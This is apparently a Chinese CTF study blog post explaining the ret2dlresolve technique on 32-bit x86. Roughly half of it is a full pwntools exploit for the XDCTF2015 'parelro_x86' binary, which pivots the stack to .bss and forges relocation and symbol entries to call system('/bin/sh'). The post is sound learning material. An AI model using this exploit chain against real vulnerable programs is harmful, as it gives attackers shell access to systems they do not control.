# pwn初学者的进阶（二）：ret2dlresolve学习记录


花了一个上午时间，看了一下ret2dlresolve的基本原理与基本的利用过程。觉得步骤与相关细节要素还是蛮多的，为防止今后某一天再用到的时候忘得干干净净，特此记录一些我个人的理解，加深印象。

<!--more-->

## 0x00 dlresolve原理

以下内容是32位x86平台相关，64位的ret2dlresolve我还没看。

这一部分内容需要记住的就是符号解析的过程，也是dlresolve执行的过程，同时也是ret2dlresolve生效的核心原理。

在符号解析过程中，有三种数据结构：`ELF32_Rel`、`ELF32_sym`、`.dynstr中的字符串`，分别位于`.rel.plt`、`.dynsym`、`.dynstr`节（section），查看这些节的命令为

```bash
readelf -S elf_name
```

在程序第一次调用某个函数时，关于plt处指令以及push操作什么的就不细说了，我认为整个流程大致可以这么理解：

- `func@plt`处的指令相当于先push一个`offset`值，然后调用`plt[0]`处的指令，这条指令相当于执行`_dl_runtime_resolve(link_map_obj, reloc_index)`，这里的`reloc_index`就是前面`func@plt`push的`offset`

- 接下来就是三步走了，从函数原型`_dl_runtime_resolve(link_map_obj, reloc_index)`出发，根据`reloc_index`（相对于`.rel.plt`的字节偏移量，单位：字节）找到`.rel.plt`中的`ELF32_Rel`对象（大小为8字节），其中记录了一个`r_info`
- 再根据`r_info`（相对于`.dynsym`的索引，单位：0x10字节）找到`.dynsym`中的`ELF32_sym`类型对象（大小为0x10字节）
- 再根据`ELF32_sym`中的`st_name`字段（相对于`.synstr`的字节偏移量，单位：字节），找到`.dynstr`中的字符串，也就是函数名（正常执行流程是这样的），然后dlresolve从libc中查找，再计算实际地址，将其填入`ELF32_Rel`对象中的`r_offset`字段...

整个流程概括起来就是，`func@plt`给`_dl_runtime_resolve`传参数，`_dl_runtime_resolve`根据其参数去查询上面的那几个表获取函数名称，然后对libc进行解析，获取实际地址，写入got表。

## 0x01 攻击方法

感觉很多题都可以栈迁移，再加上如果`.bss`段可写的话，我们就可以控制将函数栈迁移到自己构造的栈上。

 于是，最常规的攻击步骤就是：

- 栈迁移，然后调用`plt[0]`处指令
- 控制栈上的参数（对于`_dl_runtime_resolve`而言），以及想要调用的函数的参数（比如`system`）
- 再在栈上构造对应该参数的`ELF32_Rel`类型对象
- 再在栈上构造对应`ELF32_Rel`中`r_info`的`ELF32_sym`类型对象
- 再在栈上构造对应于`ELF32_sym`中`st_name`的字符串

所以一个典型的exp为：

```python
from pwn import *
elf = ELF('./parelro_x86')
offset = 112
read_plt = elf.plt['read']

ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"
pop_ebp_ret = 0x0804861b # ROPgadget --binary parelro_x86 | grep 'pop ebp ; ret'
leave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"

stack_size = 0x800
bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"
plt_0 = 0x08048380 # objdump -d -j .plt bof  执行 <push link_map，jmp dl_resolve>
rel_plt = 0x08048330 # objdump -s -j .rel.plt bof

# 栈迁移的目的地
base_stage = bss_addr + stack_size

index_offset = (base_stage + 28) - rel_plt # base_stage + 28指向fake_reloc，减去rel_plt即偏移
write_got = elf.got['write']
dynsym = 0x080481d8
dynstr = 0x08048278

# fake_sym_addr 地址按照0x10字节对齐
fake_sym_addr = base_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf) # 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小
fake_sym_addr = fake_sym_addr + align

index_dynsym = (fake_sym_addr - dynsym) // 0x10 # 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号
r_info = (index_dynsym << 8) | 0x7 # 要满足：ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT，即最低字节要为7
fake_reloc = p32(write_got) + p32(r_info)
st_name = (fake_sym_addr + 0x10) - dynstr # 加0x10因为Elf32_Sym的大小为0x10
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)


r = process('./parelro_x86')

r.recvuntil('Welcome to XDCTF2015~!\n')
payload = b'A' * offset
payload += p32(read_plt) # 读100个字节到base_stage
payload += p32(ppp_ret)
payload += p32(0)
payload += p32(base_stage)
payload += p32(100)
payload += p32(pop_ebp_ret) # 把base_stage pop到ebp中
payload += p32(base_stage)
payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stage
r.sendline(payload)

cmd = b"/bin/sh"

# stage3: 
# 栈迁移，调plt[0]，传入伪造的 index_offset，指向我们自定义的.rel.plt表项内容
# 并且控制r_info，指向我们伪造的.dynsym表项；再控制.dynsym表项中的st_name，指向我们控制的.dynstr表项内容
# --------> base_stage
payload2 = b'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += b'AAAA'
payload2 += p32(base_stage + 80) # 对应system('/bin/sh')
payload2 += p32(0xdeadbeef) # 后面的2个参数不需要了
payload2 += p32(0xdeadbeef)
# (base_stage+28)的位置
payload2 += fake_reloc
# (base_stage+36)的位置
payload2 += b'B' * align
# (fake_sym_addr)的位置
payload2 += fake_sym
payload2 += b"system\x00"
payload2 += b'A' * (80 - len(payload2))
# base_stage + 80
payload2 += cmd + b'\x00'
payload2 += b'A' * (100 - len(payload2))
# payload2结束，刚好100字节

r.sendline(payload2)
r.interactive()
```

写一遍下来，感觉在没有完完全全弄透彻的情况下，通过文字描述清晰还是比较难的，但也只能先这样了:no_mouth:



## 参考链接：

- 《ctf竞赛权威指南(pwn篇)》--$10.6:ret2dl-resolve
- [Return-to-dl-resolve](http://pwn4.fun/2016/11/09/Return-to-dl-resolve/) （复现平台：ubuntu16）
- [CTF Wiki: ret2dlresolve](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/)
- [[原创]高级栈溢出之ret2dlresolve详解(x86&x64)，附源码分析](https://bbs.pediy.com/thread-266769.htm) （和上两篇博文差不多，但是_dl_runtime_resolve()的执行过程写得很清晰，给作者点个赞）


